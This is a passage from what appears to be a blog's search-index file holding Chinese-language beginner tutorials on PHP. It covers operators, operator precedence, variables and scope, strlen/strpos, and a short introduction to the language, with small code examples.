$y);var_dump($x &lt;&gt; $y);var_dump($x !== $y);?&gt;</p><p><strong>3.三元运算符</strong><br>另一个条件运算符是”?:”（或三元）运算符 。</p><p>语法格式</p><p>(expr1) ? (expr2) : (expr3)<br>对 expr1 求值为 TRUE 时的值为 expr2，在 expr1 求值为 FALSE 时的值为 expr3。</p><p>自 PHP 5.3 起，可以省略三元运算符中间那部分。表达式 expr1 ?: expr3 在 expr1 求值为 TRUE 时返回 expr1，否则返回 expr3。</p><p>实例</p><p>以下实例中通过判断 $_GET 请求中含有 user 值，如果有返回 $_GET[‘user’]，否则返回 nobody：</p><p><strong>4.组合比较符(PHP7+)</strong><br>PHP7+ 支持组合比较符（combined comparison operator）也称之为太空船操作符，符号为 &lt;=&gt;。组合比较运算符可以轻松实现两个变量的比较，当然不仅限于数值类数据的比较。</p><p>语法格式如下：</p><p>$c = $a &lt;=&gt; $b;<br>解析如下：</p><p>如果 $a &gt; $b, 则 $c 的值为 1。<br>如果 $a == $b, 则 $c 的值为 0。<br>如果 $a &lt; $b, 则 $c 的值为 -1。<br>实例如下：</p><p>实例<br>&lt;?php<br>// 整型<br>echo 1 &lt;=&gt; 1; // 0<br>echo 1 &lt;=&gt; 2; // -1<br>echo 2 &lt;=&gt; 1; // 1</p><p>// 浮点型<br>echo 1.5 &lt;=&gt; 1.5; // 0<br>echo 1.5 &lt;=&gt; 2.5; // -1<br>echo 2.5 &lt;=&gt; 1.5; // 1</p><p>// 字符串<br>echo “a” &lt;=&gt; “a”; // 0<br>echo “a” &lt;=&gt; “b”; // -1<br>echo “b” &lt;=&gt; “a”; // 1<br>?&gt;</p><p><strong>5.运算符优先级</strong><br>下表按照优先级从高到低列出了运算符。同一行中的运算符具有相同优先级，此时它们的结合方向决定求值顺序。</p><p>说明：左 ＝ 从左到右，右 ＝ 从右到左。</p><p>结合方向    运算符    附加信息<br>无    clone new    clone 和 new<br>左    [    array()<br>右    ++ – ~ (int) (float) (string) (array) (object) (bool) @    类型和递增／递减<br>无    instanceof    类型<br>右    !    逻辑运算符<br>左    * / %    算术运算符<br>左    + – .    算术运算符和字符串运算符<br>左    &lt;&lt; &gt;&gt;    位运算符<br>无    == != === !== &lt;&gt;    比较运算符<br>左    &amp;    位运算符和引用<br>左    ^    位运算符<br>左    |    位运算符<br>左    &amp;&amp;    逻辑运算符<br>左    ||    逻辑运算符<br>左    ? :    三元运算符<br>右    = += -= *= /= .= %= &amp;= |= ^= &lt;&lt;= &gt;&gt;= =&gt;    赋值运算符<br>左    and    逻辑运算符<br>左    xor    逻辑运算符<br>左    or    逻辑运算符<br>左    ,    多处用到<br>运算符优先级中，or 和 ||，&amp;&amp; 和 and 都是逻辑运算符，效果一样，但是其优先级却不一样。</p><p><strong>括号的使用</strong></p><p>我们通过括号的配对来明确标明运算顺序，而非靠运算符优先级和结合性来决定，通常能够增加代码的可读性。</p><p>实例<br>&lt;?php<br>// 括号优先运算</p><p>$a = 1;<br>$b = 2;<br>$c = 3;<br>$d = $a + $b * $c;<br>echo $d;<br>echo “\n”;<br>$e = ($a + $b) * $c; // 使用括号<br>echo $e;<br>echo “\n”;<br>?&gt;</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>PHP：基本语法（1）</title>
      <link href="2020/10/14/php-ji-ben-yu-fa-1/"/>
      <url>2020/10/14/php-ji-ben-yu-fa-1/</url>
      
        <content type="html"><![CDATA[<p><strong>1.PHP脚本以&lt;?php开始，</strong></p><p>以?&gt;结束</p><p>php中的每个代码行都必须以分号结束，用于把指令集区分开来。</p><p><strong>2.PHP变量</strong></p><p>变量是用于存储信息的”容器”:</p><p>实例</p><!--?php$x=5;$y=6;$z=$x+$y;echo $z;?--><p>在PHP中，这些字母被称为变量。变量是用于存储数据的容器。</p><p>PHP 变量规则：</p><p>变量以 $ 符号开始，后面跟着变量的名称<br>变量名必须以字母或者下划线字符开始<br>变量名只能包含字母数字字符以及下划线（A-z、0-9 和 _ ）<br>变量名不能包含空格<br>变量名是区分大小写的（$y 和 $Y 是两个不同的变量）</p><p><strong>3.PHP变量作用域</strong></p><p>变量的作用域是脚本中变量可被引用的部分</p><p>PHP有四种不同的变量作用域：</p><p>local  global  static  parameter</p><p>局部和全局作用域<br>在所有函数外部定义的变量，拥有全局作用域。除了函数外，全局变量可以被脚本中的任何部分访问，要在一个函数中访问一个全局变量，需要使用 global 关键字。</p><p>在 PHP 函数内部声明的变量是局部变量，仅能在函数内部访问</p><p>Static 作用域<br>当一个函数完成时，它的所有变量通常都会被删除。然而，有时候您希望某个局部变量不要被删除。</p><p>要做到这一点，请在您第一次声明变量时使用 static 关键字：</p><p>实例<br>&lt;?php<br>function myTest()<br>{<br>  static $x=0;<br>  echo $x;<br>  $x++;<br>  echo PHP_EOL;  // 换行符<br>}</p><p>myTest();<br>myTest();<br>myTest();<br>?&gt;</p><p><strong>4.PHP 并置运算符</strong><br>在 PHP 中，只有一个字符串运算符。</p><p>并置运算符 (.) 用于把两个字符串值连接起来。</p><p>下面的实例演示了如何将两个字符串变量连接在一起：</p><p>实例<br><!--?php $txt1="Hello world!"; $txt2="What a nice day!"; echo $txt1 . " " . $txt2; ?--><br>上面的代码将输出：Hello world! What a nice day!</p><p><strong>5.PHP strlen() 函数</strong><br>有时知道字符串值的长度是很有用的。</p><p>strlen() 函数返回字符串的长度（字节数）。</p><p>下面的实例返回字符串 “Hello world!” 的长度：</p><p>实例<br><!--?php echo strlen("Hello world!"); ?--></p><p>上面的代码将输出12</p><p><strong>6.PHP strpos() 函数</strong><br>strpos() 函数用于在字符串内查找一个字符或一段指定的文本。</p><p>如果在字符串中找到匹配，该函数会返回第一个匹配的字符位置。如果未找到匹配，则返回 FALSE。</p><p>下面的实例在字符串 “Hello world!” 中查找文本 “world”：</p><p>实例<br><!--?php echo strpos("Hello world!","world"); ?--></p><p>运行实例 »<br>上面的代码将输出：6</p><p>提示：在上面的实例中，字符串 “world” 的位置是 6。<strong>之所以是 6 而不是 7 的原因是，字符串中第一个字符的位置是 0，而不是 1。</strong></p><p><strong>7.PHP 算术运算符</strong><br>运算符    名称                            描述                           实例                  结果<br>x + y       加                                 x 和 y 的和                2 + 2                4<br>x - y        减                                 x 和 y 的差                5 - 2                 3<br>x * y       乘                                 x 和 y 的积                5 * 2                10<br>x / y        除                                 x 和 y 的商               15 / 5                3<br>x % y      模（除法的余数）      x 除以 y 的余数        5 % 2                1<br>- x           取反                             x 取反                       <!--?php              -2                                                                                      $x =2;                                                                                      echo -$x;                                                                                      ?--><br>a . b        并置                            连接两个字符串    “Hi” . “Ha”        HiHa</p><p><strong>8.PHP 赋值运算符</strong><br>在 PHP 中，基本的赋值运算符是 “=”。它意味着左操作数被设置为右侧表达式的值。也就是说，”$x = 5” 的值是 5。</p><p>运算符    等同于         描述<br>x = y       x = y            左操作数被设置为右侧表达式的值<br>x += y     x = x + y      加<br>x -= y      x = x - y       减<br>x *= y     x = x * y      乘<br>x /= y      x = x / y      除<br>x %= y    x = x % y     模（除法的余数）<br>a .= b    a = a . b        连接两个字符串<br>以下实例演示了使用不同赋值运算符得到的不同结果：</p><p>实例<br>&lt;?php<br>$x=10;<br>echo $x; // 输出10</p><p>$y=20;<br>$y += 100;<br>echo $y; // 输出120</p><p>$z=50;<br>$z -= 25;<br>echo $z; // 输出25</p><p>$i=5;<br>$i *= 6;<br>echo $i; // 输出30</p><p>$j=10;<br>$j /= 5;<br>echo $j; // 输出2</p><p>$k=15;<br>$k %= 4;<br>echo $k; // 输出3<br>?&gt;</p><p><strong>9.PHP 递增/递减运算符</strong><br>运算符    名称        描述<br>++ x        预递增    x 加 1，然后返回 x<br>x ++        后递增    返回 x，然后 x 加 1<br>– x          预递减    x 减 1，然后返回 x<br>x –          后递减    返回 x，然后 x 减 1<br>以下实例演示了使用递增/递减运算符得到的结果：</p><p>实例<br>&lt;?php<br>$x=10;<br>echo ++$x; // 输出11</p><p>$y=10;<br>echo $y++; // 输出10</p><p>$z=5;<br>echo –$z; // 输出4</p><p>$i=5;<br>echo $i–; // 输出5<br>?&gt;</p><p><strong>10.PHP 比较运算符</strong><br>比较操作符可以让您比较两个值：</p><p>运算符        名称              描述                                                                                 实例<br>x == y         等于              如果 x 等于 y，则返回 true                                           5==8 返回 false<br>x === y       绝对等于      如果 x 等于 y，且它们类型相同，则返回 true            5===”5” 返回 false<br>x != y          不等于          如果 x 不等于 y，则返回 true                                       5!=8 返回 true<br>x &lt;&gt; y         不等于          如果 x 不等于 y，则返回 true                                       5&lt;&gt;8 返回 true<br>x !== y        绝对不等于  如果 x 不等于 y，或它们类型不相同，则返回 true     5!==”5” 返回 true<br>x &gt; y           大于              如果 x 大于 y，则返回 true                                           5&gt;8 返回 false<br>x &lt; y           小于              如果 x 小于 y，则返回 true                                           5&lt;8 返回 true<br>x &gt;= y         大于等于      如果 x 大于或者等于 y，则返回 true                            5&gt;=8 返回 false<br>x &lt;= y         小于等于      如果 x 小于或者等于 y，则返回 true                            5&lt;=8 返回 true<br>以下实例演示了使用一些比较运算符得到的不同结果：</p><p>实例<br>&lt;?php<br>$x=100;<br>$y=”100”;</p><p>var_dump($x == $y);<br>echo “ <br>“;<br>var_dump($x === $y);<br>echo “ <br>“;<br>var_dump($x != $y);<br>echo “ <br>“;<br>var_dump($x !== $y);<br>echo “ <br>“;</p><p>$a=50;<br>$b=90;</p><p>var_dump($a &gt; $b);<br>echo “<br>“;<br>var_dump($a &lt; $b);<br>?&gt;</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>PHP：介绍</title>
      <link href="2020/10/08/php-jie-shao/"/>
      <url>2020/10/08/php-jie-shao/</url>
      
        <content type="html"><![CDATA[<h2 id="PHP-是什么？"><a href="#PHP-是什么？" class="headerlink" title="PHP 是什么？"></a>PHP 是什么？</h2><ul><li>PHP（全称：PHP：Hypertext Preprocessor，即”PHP：超文本预处理器”）是一种通用开源脚本语言。</li><li>PHP 脚本在服务器上执行。</li><li>PHP 可免费下载使用。</li></ul><h2 id="PHP-文件是什么？"><a href="#PHP-文件是什么？" class="headerlink" title="PHP 文件是什么？"></a>PHP 文件是什么？</h2><ul><li>PHP 文件可包含文本、HTML、JavaScript代码和 PHP 代码</li><li>PHP 代码在服务器上执行，结果以纯 HTML 形式返回给浏览器</li><li>PHP 文件的默认文件扩展名是 “.php”</li></ul><h2 id="为什么使用-PHP？"><a href="#为什么使用-PHP？" class="headerlink" title="为什么使用 PHP？"></a>为什么使用 PHP？</h2><ul><li>PHP 可在不同的平台上运行（Windows、Linux、Unix、Mac OS X 等）</li><li>PHP 与目前几乎所有的正在被使用的服务器相兼容（Apache、IIS 等）</li><li>PHP 提供了广泛的数据库支持</li><li>PHP 是免费的，可从官方的 PHP 资源下载它：<a href="http://www.php.net/"> www.php.net</a></li><li>PHP 易于学习，并可高效地运行在服务器端</li></ul>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
